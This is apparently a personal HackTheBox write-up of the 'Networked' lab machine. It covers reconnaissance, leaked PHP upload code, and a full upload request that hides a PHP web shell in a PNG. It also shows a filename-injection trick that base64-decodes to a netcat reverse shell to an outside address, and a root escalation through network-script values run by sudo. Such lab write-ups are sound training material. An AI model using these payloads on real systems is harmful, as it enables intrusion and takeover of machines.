---
tags:
  - hack
  - linux
---
# HackTheBox: [Networked](https://app.hackthebox.com/machines/Networked)

These are my own lightly-edited notes, and not necessarily a detailed walk-through.

## Summary

A weird misconfiguration allows uploading a web-shell because any file with "php" in the name will execute. For `root`, this is a demonstration of why you can't let an unprivileged user modify network configuration scripts.

## Services

### TCP

`nmap` TCP scan:

```console
$ cat tcp_full
# Nmap 7.94SVN scan initiated Mon Jul  1 14:58:18 2024 as: nmap -v -sCV -p- -T4 --min-rate 10000 -oN tcp_full t
Nmap scan report for t (10.10.10.146)
Host is up (0.10s latency).
Not shown: 65513 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  1 14:58:44 2024 -- 1 IP address (1 host up) scanned in 25.78 seconds
```

#### 80/tcp-http

```text
__http-methods:
  Supported Methods: GET HEAD POST OPTIONS
__http-server-header:
Apache/2.4.6 (CentOS) PHP/5.4.16
__http-title:
Site doesn't have a title (text/html; charset=UTF-8).
```

```console
$ curl http://t
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>

$ whatweb -a3 http://t
http://t [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.146], PHP[5.4.16], X-Powered-By[PHP/5.4.16]
```

`feroxbuster` finds:

```console
301      GET        7l       20w      225c http://t/uploads => http://t/uploads/
301      GET        7l       20w      224c http://t/backup => http://t/backup/
```

```console
$ wget http://10.10.10.146/backup/backup.tar
--2024-07-01 15:00:18--  http://10.10.10.146/backup/backup.tar
Connecting to 10.10.10.146:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240 (10K) [application/x-tar]
Saving to: ‘backup.tar’
backup.tar                         100%[================================================================>]  10.00K  --.-KB/s    in 0.001s
2024-07-01 15:00:18 (15.6 MB/s) - ‘backup.tar’ saved [10240/10240]

$ tar tvf backup.tar
-rw-r--r-- root/root       229 2019-07-09 05:33 index.php
-rw-r--r-- root/root      2001 2019-07-02 05:38 lib.php
-rw-r--r-- root/root      1871 2019-07-02 06:53 photos.php
-rw-r--r-- root/root      1331 2019-07-02 06:45 upload.php
```

`lib.php`:

```php
<?php
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}
function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}
function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}
function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }
}
function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}
?>
```

`upload.php`:

```php
<?php
require '/var/www/html/lib.php';
define("UPLOAD_DIR", "/var/www/html/uploads/");
if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];
    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }
    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }
    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";
    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

`photos.php`:

```php
$ cat photos.php
<html>
<head>
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;margin:0px auto;}
.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;}
.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;}
.tg .tg-0lax{text-align:left;vertical-align:top}
@media screen and (max-width: 767px) {.tg {width: auto !important;}.tg col {width: auto !important;}.tg-wrap {overflow-x: auto;-webkit-overflow-scrolling: touch;margin: auto 0px;}}</style>
</head>
<body>
Welcome to our awesome gallery!</br>
See recent uploaded pictures from our community, and feel free to rate or comment</br>
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$ignored = array('.', '..', 'index.html');
$files = array();
$i = 1;
echo '<div class="tg-wrap"><table class="tg">'."\n";
foreach (scandir($path) as $file) {
  if (in_array($file, $ignored)) continue;
  $files[$file] = filemtime($path. '/' . $file);
}
arsort($files);
$files = array_keys($files);
foreach ($files as $key => $value) {
  $exploded  = explode('.',$value);
  $prefix = str_replace('_','.',$exploded[0]);
  $check = check_ip($prefix,$value);
  if (!($check[0])) {
    continue;
  }
  // for HTB, to avoid too many spoilers
  if ((strpos($exploded[0], '10_10_') === 0) && (!($prefix === $_SERVER["REMOTE_ADDR"])) ) {
    continue;
  }
  if ($i == 1) {
    echo "<tr>\n";
  }
echo '<td class="tg-0lax">';
echo "uploaded by $check[1]<br>";
echo "<img src='uploads/".$value."' width=100px>";
echo "</td>\n";
  if ($i == 4) {
    echo "</tr>\n";
    $i = 1;
  } else {
    $i++;
  }
}
if ($i < 4 && $i > 1) {
    echo "</tr>\n";
}
?>
</table></div>
</body>
</html>
```

## RCE

This request embeds a PHP webshell:

```http
POST /upload.php HTTP/1.1
Host: networked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2379326761275337209493037776
Content-Length: 549
Origin: http://networked.htb
DNT: 1
Connection: keep-alive
Referer: http://networked.htb/upload.php
Upgrade-Insecure-Requests: 1


-----------------------------2379326761275337209493037776
Content-Disposition: form-data; name="myFile"; filename="shell.php.png"
Content-Type: image/png

PNG

 xxxÅ_É}ÓÙï>(ô¸Ò
2ÅU8ØôT%qQ}{è¬+MÉÎýE«{¿bDÏ¹%ngJ6éÅùfÓUÂK\qù,Ou¨«Óþt¥° þß¿¾µü ­lrN/ö"    IEND®B`
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>

-----------------------------2379326761275337209493037776
Content-Disposition: form-data; name="submit"

go!
-----------------------------2379326761275337209493037776--
```

On the target, this file ends up being named `http://networked.htb/uploads/10_10_14_21.php.png`, but it still executes as PHP even though the extension is PNG. Why? [0xdf explains here](https://0xdf.gitlab.io/2019/11/16/htb-networked.html#what-why) .

With a shell on the system I see there's a user `guly` with a cron job:

```console
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.2$ ls /home
guly
bash-4.2$ cd /home/guly/
bash-4.2$ ls
check_attack.php  crontab.guly  user.txt
```

```php
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
bash-4.2$ cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
?>
```

```text
bash-4.2$ ls -l check_attack.php
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
```

I can control the `$value` parameter in the `check_attack.php` file by `touch`ing files in the `/var/www/html/uploads` directory. This filename works for a reverse shell:

```console
bash-4.2$ ls -l
total 8
-rw-r--r--  1 apache apache  0 Sep 26 19:43 echo; echo bm9odXAgbmMgMTAuMTAuMTQuMjEgNDQzIC1lIC91c3IvYmluL2Jhc2gK |base64 -d |sh;echo
-r--r--r--. 1 root   root    2 Oct 30  2018 index.html
```

```console
Kill set to control-U (^U).
Interrupt set to control-C (^C).
[guly@networked ~]$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
```

## PE

```console
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

There is an issue where network script values with a space result in code execution. e.g.:

```console
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
x
interface PROXY_METHOD:
x
interface BROWSER_ONLY:
x
interface BOOTPROTO:
x sh
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

Details here: <https://seclists.org/fulldisclosure/2019/Apr/24>

## After `root`

This configuration allows PHP execution if `php` is anywhere in the filename, not just the suffix:

```console
sh-4.2# cat /etc/httpd/conf.d/php.conf
AddHandler php5-script .php
AddType text/html .php
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```

More details here: <https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler>

## Credits

I never would have guessed this particular misconfiguration. I had lots of hints from [this write-up from 0xdf](https://0xdf.gitlab.io/2019/11/16/htb-networked.html).
